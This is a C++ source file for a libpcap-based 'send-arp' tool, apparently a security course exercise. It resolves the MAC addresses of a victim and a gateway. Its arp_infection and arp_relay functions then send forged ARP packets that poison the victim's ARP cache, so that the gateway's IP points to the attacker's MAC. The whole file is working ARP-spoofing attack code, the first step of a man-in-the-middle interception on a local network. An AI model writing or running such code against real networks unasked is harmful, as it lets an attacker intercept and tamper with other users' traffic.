#include <cstdio>
#include <string>
#include <iostream>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <pcap.h>
#include <unistd.h>
#include <vector>

#pragma pack(push, 1)

struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct sender_target_ip final {
	Ip sender;
	Ip target;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

using namespace std;

bool send_arp_request(pcap_t* dev, Mac my_mac, Ip my_ip, Ip target_ip, Mac& target_mac);
bool getMacIpAddr(string &iface_name, Mac& mac_addr, Ip& ip_addr);
bool arp_infection(pcap_t* dev, Mac attack_mac, Mac sender_mac, Ip sender_ip, Ip target_ip);
bool arp_relay(pcap_t* dev, Mac attack_mac, Mac target_mac, Ip sender_ip, Ip target_ip);

int main(int argc, char *argv[]) {
    if ((argc & 1) || (argc < 4)) {
        usage();
        return false;
    }
    string interface = argv[1];
    Mac iface_mac{};
    Ip  iface_ip{};

    if (!getMacIpAddr(interface, iface_mac, iface_ip)) {
        return EXIT_FAILURE;
    }

    vector<sender_target_ip> send_tar_ips;
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* pcap = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", interface.c_str(), errbuf);
        return EXIT_FAILURE;
    }

    for (int i = 2; i < argc; i += 2) { //check format x.x.x.x
        Ip send_ip = Ip(argv[i]);
        Ip target_ip = Ip(argv[i + 1]);
	
        send_tar_ips.push_back(sender_target_ip{send_ip, target_ip});
    }

    //cout << string(send_tar_ips[0].sender) << endl;

    //send arp reply
    for (int i = 0; i < send_tar_ips.size(); i++) {
        //send arp request
        Mac sender_mac("00:00:00:00:00:00");
        Mac target_mac("00:00:00:00:00:00");
        //get sender mac addr
        if (!send_arp_request(pcap, iface_mac, iface_ip,
            send_tar_ips[i].sender, sender_mac)) {
            cout << "Failed to get mac addr\n";
            return false;
        }
        //get target mac addr
        if (!send_arp_request(pcap, iface_mac, iface_ip,
            send_tar_ips[i].target, target_mac)) {
            cout << "Failed to get mac addr\n";
            return false;
            }
	    cout << string(sender_mac) << endl;
        cout << string(target_mac) << endl;

        //send arp reply to infect
        //sender = victim , target = gateway
        if (!arp_infection(pcap, iface_mac, sender_mac,
            send_tar_ips[i].sender, send_tar_ips[i].target)) {
            cout << "Failed ARP infection\n";
            return false;
        }

        //send arp relay packet
        //sender = victim , target = gateway
        if (!arp_relay(pcap, iface_mac, target_mac,
            send_tar_ips[i].sender, send_tar_ips[i].target)) {
            cout << "Failed ARP infection\n";
            return false;
            }
    }

    pcap_close(pcap);
    return EXIT_SUCCESS;
}

bool getMacIpAddr(string &iface_name, Mac& mac_addr, Ip& ip_addr) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        return false;
    }
    struct ifreq ifr {};
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface_name.c_str(), IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl(failed to get mac addr)");
        close(fd);
        return false;
    }
    Mac mac(reinterpret_cast<const uint8_t*>(ifr.ifr_hwaddr.sa_data));
    mac_addr = mac;

    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl(failed to get ip addr)");
        close(fd);
        return false;
    }
    Ip ip_tmp(ntohl(reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr)->sin_addr.s_addr));
    ip_addr = ip_tmp;

    close(fd);
    return true;
}

bool send_arp_request(pcap_t* pcap, Mac my_mac, Ip my_ip, Ip target_ip, Mac& target_mac) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(string(my_mac));
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(string(my_mac));
    packet.arp_.sip_ = htonl(static_cast<uint32_t>(my_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(static_cast<uint32_t>(target_ip));
    
    
    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        return false;
    }
    struct pcap_pkthdr* header;
    const uint8_t* recv_pkt;
    int res_recv;
    EthArpPacket pkt;

    while (true) {
	
        res_recv = pcap_next_ex(pcap, &header, &recv_pkt);
        if (res_recv == 0) continue;
	if (res_recv == PCAP_ERROR || res_recv == PCAP_ERROR_BREAK) {
            break;
        }

        memcpy(&pkt, recv_pkt, sizeof(EthArpPacket));
	if (ntohs(pkt.eth_.type_) != EthHdr::Arp) continue;
	if (ntohs(pkt.arp_.op_) != ArpHdr::Reply) continue;
	if (ntohl(pkt.arp_.sip_) != target_ip) continue;
	break;
    }

    Mac target_mac_tmp = pkt.arp_.smac_;
    target_mac = target_mac_tmp;

    return true;
}

bool arp_infection(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Ip sender_ip, Ip target_ip) {

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(string(sender_mac));
    packet.eth_.smac_ = Mac(string(attack_mac));
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    //sender
    packet.arp_.smac_ = Mac(string(attack_mac));
    packet.arp_.sip_ = htonl(target_ip);
    //target
    packet.arp_.tmac_ = Mac(string(sender_mac));
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        return false;
    }
    return true;
}

bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac target_mac, Ip sender_ip, Ip target_ip) {

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(string(target_mac));
    packet.eth_.smac_ = Mac(string(attack_mac));
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    //sender
    packet.arp_.smac_ = Mac(string(attack_mac));
    packet.arp_.sip_ = htonl(sender_ip);
    //target
    packet.arp_.tmac_ = Mac(string(target_mac));
    packet.arp_.tip_ = htonl(target_ip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        return false;
    }
    return true;
}
